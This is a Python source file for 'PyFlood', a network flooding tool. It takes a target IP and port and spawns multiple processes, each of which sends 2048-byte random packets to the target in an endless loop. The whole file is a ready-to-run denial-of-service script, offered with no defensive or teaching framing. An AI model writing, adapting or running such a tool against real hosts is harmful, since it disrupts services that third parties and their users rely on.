import argparse
import socket
import sys
import multiprocessing
import random
import string
import floodtypes


class PyFlood(multiprocessing.Process):
	def __init__(self, ip, port, flood_type):
		multiprocessing.Process.__init__(self)
		self.ip = ip
		self.port = port
		self.flood_type = flood_type

	def run(self):
		flood_type = floodtypes.FloodTypes().get_by_type(self.flood_type)
		if flood_type is None:
			raise ValueError
		self.start_flood(flood_type)

	def start_flood(self, flood_type):
		while 1:
			try:
				s = socket.socket(socket.AF_INET, flood_type.get_socket_type())
				msg = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(2048))
				s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 20)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_TTL, 20)
				s.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_LOOP, 1)

				s.sendto(msg.encode('utf-8'), (self.ip, int(self.port)))
			except socket.error:
				print('Socket error')
				sys.exit()


parser = argparse.ArgumentParser()
parser.add_argument('ip', help='Target IP address', type=str)
parser.add_argument('port', help='Target Port', type=str)
parser.add_argument('type', help='Flood type', type=int)
parser.add_argument('--procs', help='Number of processes', type=int)
parser.add_argument('--list', help='List of flood types', action='store_true')
args = parser.parse_args()
jobs = []

if __name__ == '__main__':
	if args.list:
		ft = floodtypes.FloodTypes
		for floodType in ft.get_types():
			print(str(floodType.get_type_id()), ': ' + floodType.get_name())
			sys.exit()
	elif args.ip and args.port and args.type and args.procs:
		print('Starting flood on %s processes...' % args.procs)
		for i in range(0, args.procs):
			job = PyFlood(args.ip, args.port, args.type)
			jobs.append(job)
			job.start()
		for j in jobs:
			j.join()
	elif args.ip and args.port and args.type:
		print('Starting flood...')
		PyFlood(args.ip, args.port, args.type).run()
	else:
		parser.print_help()
		sys.exit()
